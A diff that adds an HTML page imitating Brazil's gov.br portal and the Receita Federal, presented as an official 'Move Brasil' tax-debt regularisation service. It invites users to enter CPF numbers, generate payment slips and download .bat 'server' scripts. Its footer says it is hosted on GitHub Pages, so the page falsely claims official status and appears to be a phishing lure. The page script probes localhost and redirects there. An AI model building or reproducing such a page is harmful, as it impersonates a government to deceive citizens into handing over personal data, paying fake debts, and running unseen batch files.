@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Move Brasil - Governo Federal</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("static/fonts/rawline-400.ea42a37247439622.woff2") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("static/fonts/rawline-500.f8af4ec801afaa28.woff2") format('woff2');
+            font-weight: 500;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("static/fonts/rawline-600.844a17f0db94d147.woff2") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("static/fonts/rawline-700.1c7c76152b40409f.woff2") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("static/fonts/rawline-800.5c5f78761d00551b.woff2") format('woff2');
+            font-weight: 800;
+            font-style: normal;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Rawline', sans-serif; }
+        html { scroll-behavior: smooth; }
+
+        .main-header {
+            position: fixed; top: 0; left: 0; right: 0; z-index: 1000; width: 100%;
+        }
+        .header-govbar { width: 100%; background: #071D41; }
+        .header-govbar-inner {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 6px 24px; max-width: 1200px; margin: 0 auto;
+        }
+        .header-govbar .gov-logo { font-weight: 700; font-size: 1.05rem; user-select: none; }
+        .header-govbar .gov-logo-gov { color: #ffffff; }
+        .header-govbar .gov-logo-br { color: #FFCC29; }
+        .header-govbar .gov-utilities { display: flex; align-items: center; gap: 10px; }
+        .header-govbar .gov-icon-btn {
+            display: flex; align-items: center; justify-content: center;
+            background: none; border: none; cursor: pointer;
+            padding: 4px; border-radius: 4px; color: #ffffff;
+        }
+        .header-govbar .gov-divider { width: 1px; height: 20px; background: rgba(255,255,255,0.25); }
+        .header-govbar .gov-avatar {
+            width: 30px; height: 30px; border-radius: 50%; background: #ffffff; color: #071D41;
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 700; font-size: 0.75rem; user-select: none;
+        }
+        .header-service { width: 100%; background: #ffffff; border-bottom: 1px solid #d4d4d4; }
+        .header-service-inner {
+            display: flex; align-items: center; gap: 12px;
+            padding: 8px 24px; max-width: 1200px; margin: 0 auto;
+        }
+        .header-service .service-brand { display: flex; align-items: center; gap: 10px; flex: 1; }
+        .header-service .service-icon { width: 34px; height: 34px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+        .header-service .service-name { display: flex; flex-direction: column; line-height: 1.2; }
+        .header-service .service-name-main { font-size: 0.95rem; font-weight: 700; color: #004C99; letter-spacing: 0.02em; }
+        .header-service .service-name-main .highlight-green { color: #00A859; }
+        .header-service .service-tagline { font-size: 0.72rem; font-weight: 600; color: #888888; flex-shrink: 0; white-space: nowrap; }
+        body { padding-top: 80px; color: #2c3e50; font-size: 16px; line-height: 1.6; min-height: 100vh; background: #f0f2f5; }
+
+        /* Hero Section */
+        .hero {
+            background: linear-gradient(135deg, #071D41 0%, #0c326f 50%, #1351B4 100%);
+            padding: 60px 24px 80px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.03) 0%, transparent 70%);
+            animation: heroGlow 8s ease-in-out infinite alternate;
+        }
+        @keyframes heroGlow {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(-10%, -10%); }
+        }
+        .hero-content { position: relative; z-index: 1; max-width: 800px; margin: 0 auto; }
+        .hero h1 { color: #fff; font-size: 2.5rem; font-weight: 800; margin-bottom: 16px; }
+        .hero h1 span { color: #FFCC29; }
+        .hero p { color: rgba(255,255,255,0.85); font-size: 1.1rem; max-width: 600px; margin: 0 auto 32px; }
+
+        /* Cards */
+        .cards-section { max-width: 1100px; margin: -40px auto 40px; padding: 0 24px; position: relative; z-index: 2; }
+        .cards-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 24px; }
+        .card {
+            background: #fff; border-radius: 16px; padding: 32px 24px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08); cursor: pointer;
+            transition: all 0.3s ease; text-align: center;
+            border: 1px solid rgba(0,0,0,0.04);
+        }
+        .card:hover { transform: translateY(-4px); box-shadow: 0 8px 30px rgba(0,0,0,0.12); }
+        .card-icon { font-size: 2.5rem; margin-bottom: 16px; color: #0c326f; }
+        .card h3 { font-size: 1.2rem; font-weight: 700; color: #071D41; margin-bottom: 8px; }
+        .card p { color: #666; font-size: 0.9rem; }
+
+        /* Server Status */
+        .server-status {
+            max-width: 600px; margin: 0 auto 40px; padding: 0 24px;
+        }
+        .status-box {
+            background: #fff; border-radius: 16px; padding: 32px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            text-align: center; border: 1px solid rgba(0,0,0,0.04);
+        }
+        .status-indicator {
+            display: inline-flex; align-items: center; gap: 10px;
+            padding: 10px 24px; border-radius: 50px; font-weight: 600;
+            margin-bottom: 20px; font-size: 0.95rem;
+        }
+        .status-indicator.online { background: #d4edda; color: #155724; }
+        .status-indicator.offline { background: #f8d7da; color: #721c24; }
+        .status-indicator .dot {
+            width: 10px; height: 10px; border-radius: 50%; display: inline-block;
+        }
+        .status-indicator.online .dot { background: #28a745; box-shadow: 0 0 8px rgba(40,167,69,0.5); animation: pulse-dot 1.5s infinite; }
+        .status-indicator.offline .dot { background: #dc3545; }
+        @keyframes pulse-dot { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .status-box .btn {
+            display: inline-block; padding: 14px 40px; border-radius: 8px;
+            font-weight: 700; font-size: 1rem; cursor: pointer; border: none;
+            transition: all 0.3s ease; text-decoration: none;
+        }
+        .btn-primary { background: linear-gradient(135deg, #0a2966, #0c326f); color: #fff; box-shadow: 0 4px 12px rgba(12,50,111,0.3); }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(12,50,111,0.4); }
+        .btn-success { background: linear-gradient(135deg, #28a745, #34ce57); color: #fff; box-shadow: 0 4px 12px rgba(40,167,69,0.3); }
+        .btn-success:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(40,167,69,0.4); }
+        .status-details { margin-top: 20px; color: #666; font-size: 0.9rem; }
+        .status-details p { margin: 4px 0; }
+
+        /* Acessos Rápidos */
+        .quick-links { max-width: 1100px; margin: 0 auto 40px; padding: 0 24px; }
+        .quick-links h2 { text-align: center; font-size: 1.5rem; font-weight: 700; color: #071D41; margin-bottom: 24px; }
+        .links-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; }
+        .quick-link {
+            background: #fff; border-radius: 12px; padding: 20px; text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.06); text-decoration: none; color: inherit;
+            transition: all 0.3s ease; border: 1px solid rgba(0,0,0,0.04);
+        }
+        .quick-link:hover { transform: translateY(-2px); box-shadow: 0 4px 16px rgba(0,0,0,0.1); }
+        .quick-link .ql-icon { font-size: 1.8rem; margin-bottom: 8px; color: #0c326f; }
+        .quick-link h4 { font-size: 0.95rem; font-weight: 600; color: #071D41; }
+
+        .footer {
+            background: linear-gradient(135deg, #01205B, #0c2e6b);
+            color: #e9ecef; padding: 24px; text-align: center; margin-top: auto; width: 100%;
+        }
+        .footer-logo { width: 100px; margin: 0 auto 12px; display: block; filter: brightness(1.2); }
+        .footer p { font-size: 0.85rem; opacity: 0.8; }
+
+        /* Info bar when local server is found */
+        .server-found-bar {
+            background: linear-gradient(135deg, #28a745, #34ce57);
+            color: #fff; padding: 12px 24px; text-align: center; font-weight: 600;
+            border-radius: 8px; margin-bottom: 16px; display: none;
+        }
+        .server-found-bar i { margin-right: 8px; }
+
+        @media (max-width: 600px) {
+            .hero { padding: 40px 16px 60px; }
+            .hero h1 { font-size: 1.8rem; }
+            .cards-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+    <header class="main-header">
+        <div class="header-govbar">
+            <div class="header-govbar-inner">
+                <div class="gov-logo">
+                    <span class="gov-logo-gov">gov</span><span class="gov-logo-br">.br</span>
+                </div>
+                <div class="gov-utilities">
+                    <button class="gov-icon-btn" type="button" aria-label="Acessibilidade">
+                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <circle cx="12" cy="5" r="2.5"/><path d="M12 8v7"/><path d="M8 13h8"/><path d="M7 18l5-3 5 3"/><path d="M17 18l-5-3-5 3"/>
+                        </svg>
+                    </button>
+                    <span class="gov-divider" aria-hidden="true"></span>
+                    <button class="gov-icon-btn" type="button" aria-label="Serviços">
+                        <svg width="18" height="18" viewBox="0 0 20 20" fill="currentColor">
+                            <rect x="2" y="2" width="4" height="4" rx="1"/><rect x="8" y="2" width="4" height="4" rx="1"/><rect x="14" y="2" width="4" height="4" rx="1"/>
+                            <rect x="2" y="8" width="4" height="4" rx="1"/><rect x="8" y="8" width="4" height="4" rx="1"/><rect x="14" y="8" width="4" height="4" rx="1"/>
+                            <rect x="2" y="14" width="4" height="4" rx="1"/><rect x="8" y="14" width="4" height="4" rx="1"/><rect x="14" y="14" width="4" height="4" rx="1"/>
+                        </svg>
+                    </button>
+                    <div class="gov-avatar" aria-hidden="true">G</div>
+                </div>
+            </div>
+        </div>
+        <div class="header-service">
+            <div class="header-service-inner">
+                <div class="service-brand">
+                    <span class="service-icon">
+                        <svg width="30" height="30" viewBox="0 0 40 40" fill="none">
+                            <rect width="40" height="40" rx="8" fill="#004C99"/>
+                            <path d="M12 20c0-4 3-7 8-7s8 3 8 7-3 7-8 7-8-3-8-7z" fill="none" stroke="#fff" stroke-width="2"/>
+                            <path d="M16 20l3 3 6-6" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                        </svg>
+                    </span>
+                    <div class="service-name">
+                        <span class="service-name-main">MOVE <span class="highlight-green">BRASIL</span></span>
+                    </div>
+                </div>
+                <span class="service-tagline">Plataforma de Regularização</span>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <h1>Bem-vindo ao <span>MOVE BRASIL</span></h1>
+            <p>Plataforma oficial de regularização fiscal do governo federal. Consulte débitos, gere guias de pagamento e regularize sua situação.</p>
+        </div>
+    </section>
+
+    <!-- Status do Servidor Local -->
+    <section class="server-status">
+        <div class="status-box">
+            <div id="serverFoundBar" class="server-found-bar">
+                <i class="fas fa-check-circle"></i> Servidor local detectado! Você será redirecionado...
+            </div>
+            <div id="statusIndicator" class="status-indicator offline">
+                <span class="dot"></span>
+                <span id="statusText">Servidor local não detectado</span>
+            </div>
+            <p style="color: #666; margin-bottom: 20px; font-size: 0.9rem;">
+                Esta é a versão estática do site. Para acessar o sistema completo com banco de dados e consultas, inicie o servidor local.
+            </p>
+            <div id="serverActions">
+                <a href="acessar-localhost.html" class="btn btn-primary">
+                    <i class="fas fa-server"></i> Tentar conectar ao servidor local
+                </a>
+                <div style="margin-top: 12px;">
+                    <button onclick="checkServer()" class="btn" style="padding: 8px 20px; font-size: 0.85rem; background: #f0f2f5; color: #333; border: 1px solid #ddd;">
+                        <i class="fas fa-sync"></i> Verificar novamente
+                    </button>
+                </div>
+            </div>
+            <div class="status-details">
+                <p><i class="fas fa-info-circle"></i> Para usar o sistema completo, execute <strong>iniciar-servidor.bat</strong> ou <strong>npm start</strong> na máquina local.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Cards de Serviços -->
+    <section class="cards-section">
+        <div class="cards-grid">
+            <a href="index-local.html" class="card" style="text-decoration: none; color: inherit; display: block;">
+                <div class="card-icon"><i class="fas fa-search"></i></div>
+                <h3>Consultar Débitos</h3>
+                <p>Consulte débitos fiscais pelo CPF e gere guias de pagamento.</p>
+            </a>
+            <a href="chat.html" class="card" style="text-decoration: none; color: inherit; display: block;">
+                <div class="card-icon"><i class="fas fa-comments"></i></div>
+                <h3>Atendimento</h3>
+                <p>Fale com nosso atendente virtual para tirar dúvidas.</p>
+            </a>
+            <a href="multa.html" class="card" style="text-decoration: none; color: inherit; display: block;">
+                <div class="card-icon"><i class="fas fa-file-invoice"></i></div>
+                <h3>2ª Via de Guia</h3>
+                <p>Emita a segunda via do seu documento de arrecadação.</p>
+            </a>
+        </div>
+    </section>
+
+    <!-- Acessos Rápidos -->
+    <section class="quick-links">
+        <h2>Acessos Rápidos</h2>
+        <div class="links-grid">
+            <a href="acessar-localhost.bat" class="quick-link">
+                <div class="ql-icon"><i class="fas fa-download"></i></div>
+                <h4>Baixar Script Local</h4>
+            </a>
+            <a href="86465465465.html" class="quick-link">
+                <div class="ql-icon"><i class="fas fa-user"></i></div>
+                <h4>Painel do Contribuinte</h4>
+            </a>
+            <a href="debitos.cadastrar.inc/index.html" class="quick-link">
+                <div class="ql-icon"><i class="fas fa-building"></i></div>
+                <h4>Portal RFB</h4>
+            </a>
+            <a href="iniciar-servidor.bat" class="quick-link">
+                <div class="ql-icon"><i class="fas fa-play"></i></div>
+                <h4>Iniciar Servidor</h4>
+            </a>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <img src="static/images/gov-logo.webp" alt="gov.br Logo" class="footer-logo">
+        <p>© 2026 Receita Federal do Brasil. Todos os direitos reservados.</p>
+        <p style="font-size: 0.75rem; opacity: 0.6; margin-top: 4px;">Versão estática - GitHub Pages</p>
+    </footer>
+
+    <script>
+        function checkServer() {
+            const statusBox = document.getElementById('statusIndicator');
+            const statusText = document.getElementById('statusText');
+            const serverFoundBar = document.getElementById('serverFoundBar');
+            const dot = statusBox.querySelector('.dot');
+
+            statusText.textContent = 'Verificando servidor local...';
+            statusBox.className = 'status-indicator';
+
+            fetch('http://localhost:3001/', { mode: 'no-cors' })
+                .then(() => {
+                    statusBox.className = 'status-indicator online';
+                    statusText.textContent = 'Servidor local detectado na porta 3001';
+                    serverFoundBar.style.display = 'block';
+                    setTimeout(() => {
+                        window.location.href = 'http://localhost:3001/';
+                    }, 2000);
+                })
+                .catch(() => {
+                    statusBox.className = 'status-indicator offline';
+                    statusText.textContent = 'Servidor local não está rodando';
+                    serverFoundBar.style.display = 'none';
+                });
+        }
+
+        // Verifica automaticamente ao carregar a página
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(checkServer, 500);
+        });
+    </script>
+</body>
+</html>
